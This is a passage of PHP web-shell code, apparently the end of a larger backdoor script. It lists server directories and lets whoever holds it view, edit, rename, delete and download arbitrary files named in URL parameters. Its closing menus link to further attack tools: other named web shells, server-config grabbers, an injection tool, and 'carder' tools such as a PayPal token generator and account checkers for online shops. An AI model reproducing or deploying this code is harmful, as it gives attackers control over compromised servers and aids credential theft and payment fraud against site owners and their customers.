	echo "Filename: <font color=lime>".basename($_GET['file'])."</font> [ <a href='?act=view&dir=$dir&file=".$_GET['file']."'>view</a> ] [ <a href='?act=edit&dir=$dir&file=".$_GET['file']."'>edit</a> ] [ <a href='?act=rename&dir=$dir&file=".$_GET['file']."'><b>rename</b></a> ] [ <a href='?act=download&dir=$dir&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=$dir&file=".$_GET['file']."'>delete</a> ]<br>";
	echo "<form method='post'>
	<input type='text' value='".basename($_GET['file'])."' name='rename' style='width: 450px;' height='10'>
	<input type='submit' name='do_rename' value='rename'>
	</form>";
} elseif($_GET['act'] == 'delete') {
	$delete = unlink($_GET['file']);
	if($delete) {
		$act = "<script>window.location='?dir=".$dir."';</script>";
	} else {
		$act = "<font color=red>permission denied</font>";
	}
	echo $act;
}else {
	if(is_dir($dir) == true) {
		echo '<table width="100%" class="table_home" border="0" cellpadding="3" cellspacing="1" align="center">
		<tr>
		<th class="th_home"><center>Name</center></th>
		<th class="th_home"><center>Type</center></th>
		<th class="th_home"><center>Size</center></th>
		<th class="th_home"><center>Last Modified</center></th>
		<th class="th_home"><center>Permission</center></th>
		<th class="th_home"><center>Action</center></th>
		</tr>';
		$scandir = scandir($dir);
		foreach($scandir as $dirx) {
			$dtype = filetype("$dir/$dirx");
			$dtime = date("F d Y g:i:s", filemtime("$dir/$dirx"));
 			if(!is_dir("$dir/$dirx")) continue;
 			if($dirx === '..') {
 				$href = "<a href='?dir=".dirname($dir)."'>$dirx</a>";
 			} elseif($dirx === '.') {
 				$href = "<a href='?dir=$dir'>$dirx</a>";
 			} else {
 				$href = "<a href='?dir=$dir/$dirx'>$dirx</a>";
 			}
 			if($dirx === '.' || $dirx === '..') {
 				$act_dir = "<a href='?act=newfile&dir=$dir'>newfile</a> | <a href='?act=newfolder&dir=$dir'>newfolder</a>";
 				} else {
 				$act_dir = "<a href='?act=rename_dir&dir=$dir/$dirx'>rename</a> | <a href='?act=delete_dir&dir=$dir/$dirx'>delete</a>";
 			}
 			echo "<tr>";
 			echo "<td class='td_home'><img src='data:image/png;base64,R0lGODlhEwAQALMAAAAAAP///5ycAM7OY///nP//zv/OnPf39////wAAAAAAAAAAAAAAAAAAAAAA"."AAAAACH5BAEAAAgALAAAAAATABAAAARREMlJq7046yp6BxsiHEVBEAKYCUPrDp7HlXRdEoMqCebp"."/4YchffzGQhH4YRYPB2DOlHPiKwqd1Pq8yrVVg3QYeH5RYK5rJfaFUUA3vB4fBIBADs='>$href</td>";
			echo "<td class='td_home'><center>$dtype</center></td>";
			echo "<td class='td_home'><center>-</center></th>";
			echo "<td class='td_home'><center>$dtime</center></td>";
			echo "<td class='td_home'><center>".w("$dir/$dirx",perms("$dir/$dirx"))."</center></td>";
			echo "<td class='td_home' style='padding-left: 15px;'>$act_dir</td>";
		}
		echo "</tr>";
		foreach($scandir as $file) {
			$ftype = filetype("$dir/$file");
			$ftime = date("F d Y g:i:s", filemtime("$dir/$file"));
			$size = filesize("$dir/$file")/1024;
			$size = round($size,3);
			if($size > 1024) {
				$size = round($size/1024,2). 'MB';
			} else {
				$size = $size. 'KB';
			}
			if(!is_file("$dir/$file")) continue;
			echo "<tr>";
			echo "<td class='td_home'><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB9oJBhcTJv2B2d4AAAJMSURBVDjLbZO9ThxZEIW/qlvdtM38BNgJQmQgJGd+A/MQBLwGjiwH3nwdkSLtO2xERG5LqxXRSIR2YDfD4GkGM0P3rb4b9PAz0l7pSlWlW0fnnLolAIPB4PXh4eFunucAIILwdESeZyAifnp6+u9oNLo3gM3NzTdHR+//zvJMzSyJKKodiIg8AXaxeIz1bDZ7MxqNftgSURDWy7LUnZ0dYmxAFAVElI6AECygIsQQsizLBOABADOjKApqh7u7GoCUWiwYbetoUHrrPcwCqoF2KUeXLzEzBv0+uQmSHMEZ9F6SZcr6i4IsBOa/b7HQMaHtIAwgLdHalDA1ev0eQbSjrErQwJpqF4eAx/hoqD132mMkJri5uSOlFhEhpUQIiojwamODNsljfUWCqpLnOaaCSKJtnaBCsZYjAllmXI4vaeoaVX0cbSdhmUR3zAKvNjY6Vioo0tWzgEonKbW+KkGWt3Unt0CeGfJs9g+UU0rEGHH/Hw/MjH6/T+POdFoRNKChM22xmOPespjPGQ6HpNQ27t6sACDSNanyoljDLEdVaFOLe8ZkUjK5ukq3t79lPC7/ODk5Ga+Y6O5MqymNw3V1y3hyzfX0hqvJLybXFd++f2d3d0dms+qvg4ODz8fHx0/Lsbe3964sS7+4uEjunpqmSe6e3D3N5/N0WZbtly9f09nZ2Z/b29v2fLEevvK9qv7c2toKi8UiiQiqHbm6riW6a13fn+zv73+oqorhcLgKUFXVP+fn52+Lonj8ILJ0P8ZICCF9/PTpClhpBvgPeloL9U55NIAAAAAASUVORK5CYII='><a href='?act=view&dir=$dir&file=$dir/$file'>$file</a></td>";
			echo "<td class='td_home'><center>$ftype</center></td>";
			echo "<td class='td_home'><center>$size</center></td>";
			echo "<td class='td_home'><center>$ftime</center></td>";
			echo "<td class='td_home'><center>".w("$dir/$file",perms("$dir/$file"))."</center></td>";
			echo "<td class='td_home' style='padding-left: 15px;'><a href='?act=edit&dir=$dir&file=$dir/$file'>edit</a> | <a href='?act=rename&dir=$dir&file=$dir/$file'>rename</a> | <a href='?act=delete&dir=$dir&file=$dir/$file'>delete</a> | <a href='?act=download&dir=$dir&file=$dir/$file'>download</a></td>";
		}
		echo "</tr></table>";
	} else {
		echo "<font color=red>can't open directory</font>";
	}
	}
echo "<center><hr><form>
<select onchange='if (this.value) window.open(this.value);'>
   <option selected='selected' value=''> Tools Creator </option>
   <option value='$ling=wso'>WSO 2.8.1</option>
   <option value='$ling=injection'>1n73ction v3</option>
   <option value='$ling=wk'>WHMCS Killer</option>
   <option value='$ling=adminer'>Adminer</option>
   <option value='$ling=b374k'>b374k Shell</option>
   <option value='$ling=scanner'>Scanner Uploader</option>
   <option value='$ling=b374k323'>b374k 3.2</option>   
   <option value='$ling=bh'>BlackHat Shell</option>      
   <option value='$ling=vhost'>Grab Config Vhost</option>  
   <option value='$ling=grabber'>Grab Config</option>  
   <option value='$ling=dhanus'>Dhanush Shell</option>     
   <option value='$ling=r57'>R57 Shell</option>    
   <option value='$ling=encodedecode'>Encode Decode</option>    
</select>
<select onchange='if (this.value) window.open(this.value);'>
   <option selected='selected' value=''> Tools Carder </option>
   <option value='$ling=extractor'>DB Email Extractor</option>
   <option value='$ling=promailerv2'>Pro Mailer V2</option>     
   <option value='$ling=bukalapak'>BukaLapak Checker</option>        
   <option value='$ling=tokopedia'>TokoPedia Checker</option>  
   <option value='$ling=tokenpp'>Paypal Token Generator</option>  
   <option value='$ling=mailer'>Mailer</option>  
   <option value='$ling=gamestopceker'>GamesTop Checker</option>
   </select>
<noscript><input type='submit' value='Submit'></noscript>
";
?>
</html>
